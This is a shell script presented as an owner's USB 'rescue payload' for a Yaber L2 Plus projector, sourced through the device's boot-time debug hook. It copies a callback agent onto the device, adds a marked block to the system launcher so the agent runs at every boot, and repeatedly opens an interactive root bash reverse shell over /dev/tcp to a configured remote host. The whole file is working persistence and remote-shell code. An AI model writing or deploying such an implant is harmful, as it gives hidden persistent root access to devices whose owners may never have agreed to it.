# Owner access toolkit USB rescue payload for owner-controlled Yaber L2 Plus.
# Sourced by /etc/rc.d/rc.debug from USB during boot/startup.
# Purpose: install/repair the persistent callback agent, install the launcher hook, then open a USB recovery shell.

MAC_HOST="REPLACE_WITH_MAC_IP"
MAC_PORTS="2323 2325 2324"
MAX_NETWORK_WAIT_LOOPS=120
MAX_CONNECT_ATTEMPTS=90

BASE_DIR="/data/projector_project"
AGENT_PATH="/data/customer/smcast/projector_agent.sh"
LAUNCHER_PATH="/data/customer/smcast/dst-launcher.sh"
HOOK_BEGIN="# OWNER_ACCESS_TOOLKIT_BEGIN"
HOOK_END="# OWNER_ACCESS_TOOLKIT_END"

USB_DIR=""
for candidate in /mnt/usb/* /dev/shm/shm_tmp/mnt/usb/*; do
  if [ -f "$candidate/sraf_dbg.sh" ]; then
    USB_DIR="$candidate"
    break
  fi
done
[ -n "$USB_DIR" ] || USB_DIR="/mnt/usb/sda1"
LOG_DIR="$USB_DIR/PROJECTOR_DEBUG_LOGS"
mkdir -p "$LOG_DIR" 2>/dev/null
STAMP="$(/bin/date +%Y%m%d_%H%M%S 2>/dev/null || echo unknown_time)"
LOG="$LOG_DIR/rescue_${STAMP}_$$_0.log"
LOG_N=0
while [ -e "$LOG" ]; do
  LOG_N=$((LOG_N + 1))
  LOG="$LOG_DIR/rescue_${STAMP}_$$_$LOG_N.log"
done

log_line() {
  echo "$*" >> "$LOG" 2>/dev/null
}

run_log() {
  log_line "$ $*"
  "$@" >> "$LOG" 2>&1
  log_line "exit=$?"
}

install_launcher_hook() {
  /bin/mkdir -p "$BASE_DIR" 2>/dev/null
  if [ ! -f "$LAUNCHER_PATH" ]; then
    log_line "launcher not found at $LAUNCHER_PATH; no persistence hook installed"
    return
  fi
  if /bin/grep -q 'OWNER_ACCESS_TOOLKIT_BEGIN' "$LAUNCHER_PATH" 2>/dev/null; then
    log_line "launcher hook already present"
    return
  fi

  backup="$BASE_DIR/dst-launcher.sh.backup_owner_access_${STAMP}_$$"
  tmp="$BASE_DIR/dst-launcher.sh.owner_access_tmp_$$"
  /bin/cp -p "$LAUNCHER_PATH" "$backup" >> "$LOG" 2>&1 || {
    log_line "launcher backup failed; not modifying launcher"
    return
  }
  /bin/cat "$LAUNCHER_PATH" > "$tmp" 2>>"$LOG" || {
    log_line "could not create temporary launcher"
    return
  }
  {
    echo ""
    echo "$HOOK_BEGIN"
    echo "# Starts the owner access callback agent. Remove this marked block to undo."
    echo "if [ -x $AGENT_PATH ]; then"
    echo "    $AGENT_PATH >> $BASE_DIR/projector_agent_boot.log 2>&1 &"
    echo "fi"
    echo "$HOOK_END"
  } >> "$tmp" 2>>"$LOG"

  if /bin/sh -n "$tmp" >> "$LOG" 2>&1; then
    /bin/mv -f "$tmp" "$LAUNCHER_PATH" >> "$LOG" 2>&1
    /bin/chmod 755 "$LAUNCHER_PATH" >> "$LOG" 2>&1 || true
    /bin/chown srafsvc:srafsvc "$LAUNCHER_PATH" >> "$LOG" 2>&1 || true
    /bin/chcon user_u:object_r:bin_exec "$LAUNCHER_PATH" >> "$LOG" 2>&1 || true
    log_line "launcher hook installed; backup=$backup"
  else
    log_line "temporary launcher failed syntax check; original left unchanged"
    /bin/rm -f "$tmp" >> "$LOG" 2>&1 || true
  fi
}

log_line "usb rescue payload started"
log_line "usb_dir=$USB_DIR"
log_line "mac_host=$MAC_HOST ports=$MAC_PORTS"
log_line "PATH=$PATH"
log_line "PWD=$PWD"
run_log /bin/whoami
run_log /bin/pwd
run_log /bin/route -n
run_log /bin/ifconfig wlan0

AGENT_SRC=""
AGENT_SRC_LABEL=""
if [ -f "$USB_DIR/projector_agent_stable.sh" ]; then
  AGENT_SRC="$USB_DIR/projector_agent_stable.sh"
  AGENT_SRC_LABEL="projector_agent_stable.sh"
elif [ -f "$USB_DIR/projector_agent_v3_candidate.sh" ]; then
  AGENT_SRC="$USB_DIR/projector_agent_v3_candidate.sh"
  AGENT_SRC_LABEL="projector_agent_v3_candidate.sh"
elif [ -f "$USB_DIR/projector_agent_v2.sh" ]; then
  AGENT_SRC="$USB_DIR/projector_agent_v2.sh"
  AGENT_SRC_LABEL="projector_agent_v2.sh"
elif [ -f "$USB_DIR/projector_agent_v2_rollback.sh" ]; then
  AGENT_SRC="$USB_DIR/projector_agent_v2_rollback.sh"
  AGENT_SRC_LABEL="projector_agent_v2_rollback.sh"
fi

if [ -n "$AGENT_SRC" ]; then
  log_line "$AGENT_SRC_LABEL found on USB; validating"
  /bin/mkdir -p "$BASE_DIR" 2>/dev/null
  /bin/cp "$AGENT_SRC" "$BASE_DIR/projector_agent_usb_repair.sh" >> "$LOG" 2>&1
  if /bin/sh -n "$BASE_DIR/projector_agent_usb_repair.sh" >> "$LOG" 2>&1; then
    if [ -f "$AGENT_PATH" ] && [ ! -f "$BASE_DIR/projector_agent.sh.backup_usb_repair" ]; then
      /bin/cp -p "$AGENT_PATH" "$BASE_DIR/projector_agent.sh.backup_usb_repair" >> "$LOG" 2>&1 || true
    fi
    /bin/mv -f "$BASE_DIR/projector_agent_usb_repair.sh" "$AGENT_PATH" >> "$LOG" 2>&1
    /bin/chmod 755 "$AGENT_PATH" >> "$LOG" 2>&1
    /bin/chown srafsvc:srafsvc "$AGENT_PATH" >> "$LOG" 2>&1 || true
    /bin/chcon user_u:object_r:bin_exec "$AGENT_PATH" >> "$LOG" 2>&1 || true
    /bin/rm -f "$BASE_DIR/projector_agent.pid" >> "$LOG" 2>&1
    install_launcher_hook
    "$AGENT_PATH" >> "$BASE_DIR/projector_agent_usb_rescue_start.log" 2>&1 &
    log_line "persistent agent repair/start attempted from $AGENT_SRC_LABEL pid=$!"
  else
    log_line "$AGENT_SRC_LABEL failed syntax validation; not installing"
  fi
else
  log_line "no projector agent file on USB; skipping persistent-agent repair"
fi

if [ ! -x /bin/bash ]; then
  log_line "/bin/bash is not executable; cannot use bash /dev/tcp callback"
  sync 2>/dev/null
  return 0 2>/dev/null || exit 0
fi

if [ "$MAC_HOST" = "REPLACE_WITH_MAC_IP" ] || [ -z "$MAC_HOST" ]; then
  log_line "MAC_HOST placeholder was not configured; skipping direct USB recovery callback"
  sync 2>/dev/null
  return 0 2>/dev/null || exit 0
fi

log_line "waiting for network/default route"
i=0
while [ "$i" -lt "$MAX_NETWORK_WAIT_LOOPS" ]; do
  ROUTE_NOW="$(/bin/route -n 2>&1)"
  WLAN_NOW="$(/bin/ifconfig wlan0 2>&1)"
  if echo "$ROUTE_NOW" | /bin/grep -q '^0\.0\.0\.0'; then
    log_line "default route detected at loop=$i"
    break
  fi
  if echo "$WLAN_NOW" | /bin/grep -q 'inet addr:'; then
    log_line "wlan0 has IPv4 but default route not seen yet at loop=$i"
  fi
  if [ $((i % 10)) -eq 0 ]; then
    log_line "network wait loop=$i"
    echo "$ROUTE_NOW" >> "$LOG" 2>/dev/null
    echo "$WLAN_NOW" >> "$LOG" 2>/dev/null
  fi
  i=$((i + 1))
  /bin/sleep 2 2>/dev/null || sleep 2
done

log_line "network wait ended loop=$i"
run_log /bin/route -n
run_log /bin/ifconfig wlan0

attempt=0
while [ "$attempt" -lt "$MAX_CONNECT_ATTEMPTS" ]; do
  for MAC_PORT in $MAC_PORTS; do
    log_line "connect attempt $attempt to $MAC_HOST:$MAC_PORT"
    /bin/bash -c 'exec 5<>/dev/tcp/'"$MAC_HOST"'/'"$MAC_PORT"'; echo "[projector USB rescue root shell connected port='"$MAC_PORT"']" >&5; /bin/whoami >&5 2>&5; /bin/pwd >&5 2>&5; exec /bin/bash -i <&5 >&5 2>&5' >> "$LOG" 2>&1
    rc=$?
    log_line "connect attempt $attempt port=$MAC_PORT returned rc=$rc"
    sync 2>/dev/null
    /bin/sleep 2 2>/dev/null || sleep 2
  done
  attempt=$((attempt + 1))
  /bin/sleep 5 2>/dev/null || sleep 5
done

log_line "usb rescue payload finished without an active recovery connection"
sync 2>/dev/null
return 0 2>/dev/null || exit 0
